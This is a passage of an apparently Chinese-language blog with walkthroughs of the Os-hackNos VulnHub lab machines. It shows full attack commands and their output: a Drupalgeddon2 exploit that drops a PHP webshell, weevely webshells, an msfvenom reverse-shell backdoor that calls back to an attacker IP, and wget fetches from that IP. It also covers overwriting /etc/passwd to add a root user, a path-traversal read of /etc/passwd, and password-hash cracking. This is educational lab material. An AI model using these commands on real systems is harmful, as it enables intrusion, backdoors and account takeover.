class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F;                                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200)                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>Web服务采用了Drupal框架</p><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对目标使用Exploit<br /><code>ruby drupalgeddon2.rb http://192.168.56.104/drupal/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Testing: Writing To Web Root   (.&#x2F;)</span><br><span class="line">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php</span><br><span class="line">[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;</span><br><span class="line">[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">[i] Fake PHP shell:   curl &#39;http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;shell.php&#39; -d &#39;c&#x3D;hostname&#39;</span><br><span class="line">hackNos&gt;&gt; id</span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)</span><br></pre></td></tr></table></figure><p>成功获取WebShell</p><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查看服务器系统版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>使用weevely编写WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass wee.php</span><br><span class="line">mv wee.php wee</span><br></pre></td></tr></table></figure><p>在服务器上用wget下载WebShell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.102&#x2F;wee</span><br><span class="line">mv wee wee.php</span><br></pre></td></tr></table></figure><p>连接WebShell<br /><code>weevely http://192.168.56.104/drupal/wee.php pass</code></p><p>使用MSFVenom编写后门<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.102 LPORT=1234 -f elf &gt; msf.elf</code></p><p>在服务器上用WebShell上传后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_upload &#x2F;root&#x2F;software&#x2F;msf.elf &#x2F;var&#x2F;www&#x2F;html&#x2F;drupal&#x2F;msf.elf</span><br><span class="line">ls -l msf.elf</span><br><span class="line">    -rw-r--r--  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">chmod 755 msf.elf</span><br><span class="line">    -rwxr-xr-x  1 www-data www-data    250 Dec  2 18:37 msf.elf</span><br><span class="line">hackNos: .&#x2F;msf.elf &amp;</span><br></pre></td></tr></table></figure><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.56.102</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line"></span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;happy_hacker&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    ad3sa&#x2F;MFODb7k</span><br><span class="line">echo &#39;test:ad3sa&#x2F;MFODb7k:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.56.102&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">happy_hacker</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p><strong>另一个思路</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">snap --version</span><br><span class="line"></span><br><span class="line">snap    2.34.2ubuntu0.1  </span><br><span class="line">snapd   2.34.2ubuntu0.1  </span><br><span class="line">series  16               </span><br><span class="line">ubuntu  16.04            </span><br><span class="line">kernel  4.4.0-142-generic</span><br></pre></td></tr></table></figure><p>CVE-2019-7304一把梭</p><hr /><p>补充一些细节<br />由于Kali在VMware下而Ubuntu在VBox，导致网络有些问题<br />Kali可以连通Ubuntu但是反之不行<br />即Kali可以用EXP获取Shell但Ubuntu不能反弹Shell给Kali<br />所以需要Windows用MSF接收反弹Shell</p><p>在EXP的Shell中，wget获取的文件权限为644且所有者为root，即不能直接wget一个Meterpreter后门程序并执行<br />但可以用wget获取weevely的WebShell，644的权限且所有者为root并不会影响WebShell的连接，而且在WebShell中，可以进行文件上传和下载，wget所得的文件权限为644，所有者为www-data，即可以用WebShell获取Meterpreter后门程序</p><p>在wget一个WebShell之前，要修改文件后缀名<br />服务器会把php后缀的文件解析并执行，就不能获取该php文件<br />而修改文件后缀名之后服务器则无法解析，从而获取WebShell<br />在获取之后修改文件后缀名为.php，并移动到Web目录下<br />即可连接WebShell</p><p>切换用户需要一个标准Shell<br />可以在Meterpreter中获取</p><hr /><h1 id="os-hacknos-2"><a class="markdownIt-Anchor" href="#os-hacknos-2"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">Os-hackNos-2</a></h1><p><code>2020/01/10 23:58:25</code></p><h2 id="端口扫描-2"><a class="markdownIt-Anchor" href="#端口扫描-2"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.1.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.1.104</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h2><p><code>dirb http://192.168.1.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.1.104&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h2><p>Web服务采用了Wordpress框架</p><p>使用wpscan针对wordpress进行扫描</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><p><code>wpscan --url http://192.168.1.104/tsweb/ --enumerate p</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.1.104&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line"></span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh flag@192.168.1.104</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><h2 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h2><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可(但是更推荐用下面的方法获取TTY)</p><p>或者使用python获取一个支持完全交互的TTY(如果目标机器上只有python3而没有python2，则改为python3执行即可)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息</p><p>发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash </span><br><span class="line"></span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line"></span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p>总体来看渗透难度并不高，但是这里我想稍微记录一些关于wpscan的内容<br />wpscan是一个基于ruby，针对wordpress框架的web扫描器<br />但是之前kali上一直运行不了wpscan，一直以为是wpscan软件的问题，多次失败之后才发现是ruby的问题<br />官网有这么一句话<br /><strong>(Optional but highly recommended: RVM)</strong><br />现在看来也觉得确实如此<br />所以一番折腾之后终于在非root用户上安装好了rvm，然后换ruby源，安装ruby2.5.5，换gem源，再用gem安装一遍wpscan<br />最后终归是能正常使用wpscan了</p><p>参考资料</p><blockquote><p><a href="https://rvm.io/rvm/install">rvm</a><br /><a href="https://ruby-china.org/wiki/rvm-guide">rvm</a><br /><a href="https://blog.51cto.com/autopython/1839229">wpscan</a><br /><a href="https://www.freebuf.com/sectool/174663.html">rvm</a><br /><a href="https://www.cnblogs.com/kuaile1314/p/12132730.html">wp</a></p></blockquote><hr /><h1 id="os-hacknos-3"><a class="markdownIt-Anchor" href="#os-hacknos-3"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-3,410/">Os-hackNos-3</a></h1><p><code>2020/01/19 21:46:32</code></p><h2 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h2><p><code>nmap -p 1-65535 -sV -A -v -T 5 -n 192.168.31.39</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.39</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ce:16:a0:18:3f:74:e9:ad:cb:a9:39:90:11:b8:8a:2e (RSA)</span><br><span class="line">|   256 9d:0e:a1:a3:1e:2c:4d:00:e8:87:d2:76:8c:be:71:9a (ECDSA)</span><br><span class="line">|_  256 63:b3:75:98:de:c1:89:d9:92:4e:49:31:29:4b:c0:ad (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: WebSec</span><br><span class="line">MAC Address: 08:00:27:19:3A:EE (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br></pre></td></tr></table></figure><h2 id="web路径枚举-3"><a class="markdownIt-Anchor" href="#web路径枚举-3"></a> Web路径枚举</h2><p>尝试爆破80端口下的Web路径<br />未发现有效信息<br />在主页处有提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find the Bug</span><br><span class="line">You need extra WebSec </span><br></pre></td></tr></table></figure><p>发现存在Web路径<code>/websec</code><br />再针对该路径进一步扫描</p><p><code>dirb http://192.168.31.39/websec/ -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;0 (CODE:200|SIZE:4346)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;01 (CODE:200|SIZE:4644)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1 (CODE:200|SIZE:4644)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;1x1 (CODE:200|SIZE:4644)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;about (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;About (CODE:200|SIZE:3754)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;admin (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;api (CODE:200|SIZE:0)                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;assets (CODE:301|SIZE:333)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;author (CODE:200|SIZE:4208)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;blog (CODE:200|SIZE:4346)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;category (CODE:200|SIZE:4366)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;cm (CODE:500|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;feed (CODE:200|SIZE:765)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;fm (CODE:200|SIZE:0)                                                       </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Index (CODE:200|SIZE:4346)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;lib (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;log (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;login (CODE:200|SIZE:1591)                                                 </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;robots.txt (CODE:200|SIZE:65)                                              </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;Search (CODE:200|SIZE:4346)                                                </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;sites (CODE:301|SIZE:331)                                                  </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;src (CODE:301|SIZE:327)                                                    </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.31.39&#x2F;websec&#x2F;tag (CODE:200|SIZE:4361)                                                   </span><br><span class="line">+ 